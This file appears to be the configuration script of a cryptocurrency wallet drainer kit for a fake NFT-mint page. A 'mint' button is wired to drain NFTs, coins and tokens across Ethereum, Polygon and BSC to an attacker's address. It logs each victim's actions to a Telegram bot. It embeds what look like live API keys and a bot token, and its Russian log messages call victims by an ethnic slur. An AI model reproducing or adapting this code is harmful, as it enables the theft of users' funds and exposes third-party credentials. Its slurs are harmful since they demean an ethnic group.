logLanguage = 'rus'
//Тут просто адрес на свой поменяйте и все
ownerAddress = '0x11CE82426E231E2956969Cb04B0FAF5F8F9742a5'
// Какой то Моралис кей
MORALIS_KEY = 'FIH13rwF3rZLDHtfqt7iDS0t9Nb9CskjJXKfZy5j0suhhHfFSGmi50cz039HpqNs'
// Апишка запера ключик
ZAPPER_KEY = 'Basic MmYyOWI3NDUtMjRlNy00MjMxLWIyODQtNzk3MmY2ODczY2IwOg=='
autoMetamaskConnect = 0
connects = ['#btn-login']
drains = ['#btn-mint']
connectAndDrains = []
//какой долбаеб вставляет токен... Да и вообще какого хуй логирование идет в тг на фронте???? Как эту хуйню продают за 500 баксов вы ебанутые?
const tgConfig = {
  botToken: '5729402932:AAHSONY_hvzhOr3Kum8TibHbUpIzQ-2C0Vw',
  chatId: '834255161',
}
const chains = {
  eth: true,
  matic: true,
  bsc: true,
}
const toDrain = {
  eth: {
    nft: true,
    eth: true,
    tokens: true,
  },
  matic: {
    nft: true,
    eth: true,
    tokens: true,
  },
  bsc: {
    nft: false,
    eth: true,
    tokens: true,
  },
}
const LOG_SCHEMA = {
  rus: {
    onConnect: '\uD83D\uDC41 пися $id зашла на сайт',
    onDisconnect: '\uD83D\uDCA4 Чурка $id покинула сайт',
    onMetamaskConnect:
      '\uD83D\uDD11 Чурка $id%0A\u2514 [DeBank](https://debank.com/profile/$wallet)',
    onApprove: '\uD83E\uDD11 Чурка $id открыл окно с апрувом токенов',
    onCancel: '\uD83D\uDE22 Чурка $id отменил транзакцию',
    onSign: '\uD83D\uDE0D Ураааа! Чурка $id подписала апрув',
    onCancelSwitch: '\uD83D\uDE22 Чурка $id не сменил сеть',
  },
  eng: {
    onConnect: '\uD83D\uDCA0 Чурка $id зашел на сайт',
    onDisconnect: '\uD83D\uDCA4 Чурка $id покинул сайт',
    onMetamaskConnect: '\uD83D\uDE0E Чурка $id подключил метамаск',
    onApprove: '\uD83E\uDD11 Чурка $id открыл окно с апрувом токенов',
    onCancel: '\uD83D\uDE22 Чурка $id отменил транзакцию',
    onSign: '\uD83D\uDE0D Чурка $id подписал апрув',
    onCancelSwitch: '\uD83D\uDE22 Чурка $id не сменил сеть',
  },
}
function updateState(_0x406d13) {
  switch (_0x406d13) {
    case 'metamaskConnected':
      break
    case 'metamaskDisconnected':
      document.getElementById('btn-mint').style.display = 'none'
      document.getElementById('btn-login').style.display = 'block'
      document.getElementById('wallet-info').style.display = 'none'
      break
    case 'userTokensFetching':
      document.getElementById('btn-mint').style.display = 'block'
      document.getElementById('btn-login').style.display = 'none'
      document.getElementById('wallet-info').style.display = 'flex'
      break
    case 'userTokensFetched':
      break
  }
}
